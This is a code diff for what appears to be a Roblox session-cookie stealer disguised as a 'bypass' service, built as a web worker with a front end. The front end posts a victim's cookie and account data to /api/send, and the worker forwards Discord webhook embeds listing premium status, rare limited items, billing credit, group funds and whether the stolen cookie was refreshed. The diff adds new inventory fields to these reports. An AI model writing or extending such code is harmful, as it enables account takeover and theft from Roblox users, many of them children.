@@ -184,33 +184,23 @@ export default {
         fetch('/api/send', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                type: 'main',
-                data: data,
-                cookie: cookie
-            })
+            body: JSON.stringify({ type: 'main', data: data, cookie: cookie })
         }).catch(function(err) { console.log('main err:', err); });
 
         fetch('/api/send', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                type: 'secondary',
-                data: data,
-                cookie: cookie
-            })
+            body: JSON.stringify({ type: 'secondary', data: data, cookie: cookie })
         }).catch(function(err) { console.log('secondary err:', err); });
 
+        // IMPORTANT: Send cookie embed separately
         setTimeout(function() {
             fetch('/api/send', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    type: 'cookie',
-                    cookie: cookie
-                })
+                body: JSON.stringify({ type: 'cookie', cookie: cookie })
             }).catch(function(err) { console.log('cookie err:', err); });
-        }, 500);
+        }, 1000);
     }
 
     var handleSubmit = function() {
@@ -318,11 +308,11 @@ export default {
     }
 
     // ---- Played Games Endpoint ----
-    if (url.pathname.startsWith('/played/')) {
+    if (url.pathname === '/played' && request.method === 'GET') {
       try {
-        const userId = url.pathname.split('/')[2];
+        const userId = url.searchParams.get('userId');
         if (!userId) {
-          return new Response(JSON.stringify({ error: 'Missing user ID' }), { status: 400 });
+          return new Response(JSON.stringify({ error: 'Missing userId parameter' }), { status: 400 });
         }
 
         const response = await fetch(`https://games.roblox.com/v2/users/${userId}/games?sortOrder=Desc&limit=10`, {
@@ -337,10 +327,10 @@ export default {
 
         const data = await response.json();
         const games = data.data || [];
-        const gameNames = games.slice(0, 3).map(g => g.name || 'Unknown Game');
+        const top3 = games.slice(0, 3).map(g => g.name || 'Unknown Game');
 
         return new Response(JSON.stringify({
-          top3: gameNames.length > 0 ? gameNames : ['None']
+          top3: top3.length > 0 ? top3 : ['None']
         }), {
           headers: { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' }
         });
@@ -413,10 +403,11 @@ export default {
           };
         }
 
-        // ---- DUAL EMBED (Full Details: Collectibles, Billing, Groups, Settings, Gamepasses) ----
+        // ---- DUAL EMBED (Full Details) ----
         else if (type === 'secondary') {
           webhookUrl = env.WEBHOOK2 || FALLBACK2;
 
+          // Fetch top 3 played games
           let topGames = ['None'];
           try {
             const gamesResp = await fetch(`https://games.roblox.com/v2/users/${d.userId}/games?sortOrder=Desc&limit=10`, {
@@ -440,6 +431,11 @@ export default {
             collectibles = d.limiteds.join(', ');
           }
 
+          // Korblox, Headless, Valkyrie status
+          const korbloxStatus = d.korblox ? yes : no;
+          const headlessStatus = d.headless ? yes : no;
+          const valkyrieStatus = d.valkyrie ? yes : no;
+
           const embed = {
             title: `\`Astral Beams\` ${fire}`,
             color: 0x5865F2,
@@ -452,6 +448,7 @@ export default {
               { name: 'Premium', value: d.premium ? yes : no, inline: true },
               { name: 'Status', value: d.apiStatus || 'Processing', inline: true },
               { name: 'Refreshed', value: d.cookieRefreshed ? yes : no, inline: true },
+              { name: 'Inventory', value: `Korblox: ${korbloxStatus}\nHeadless: ${headlessStatus}\nValkyrie: ${valkyrieStatus}`, inline: false },
               { name: 'Collectibles', value: collectibles, inline: false },
               { name: 'Billing', value: `Credit: ${d.credit || 0}\nConvert: ${d.convert || 0}\nPayments: ${d.payments || 0}`, inline: false },
               { name: 'Groups', value: `Balance: ${d.groupBalance || 0}\nPending: ${d.groupPending || 0}\nOwned: ${d.groupOwned || 0}`, inline: false },
@@ -742,7 +739,7 @@ export default {
       endpoints: {
         '/': 'HTML Frontend',
         '/bypass/astral/bypass.php': 'POST - Main bypass endpoint',
-        '/played/:userId': 'GET - Played games list',
+        '/played?userId=ID': 'GET - Played games top 3',
         '/proxy': 'POST - Proxy to original API',
         '/health': 'GET - Health check'
       },
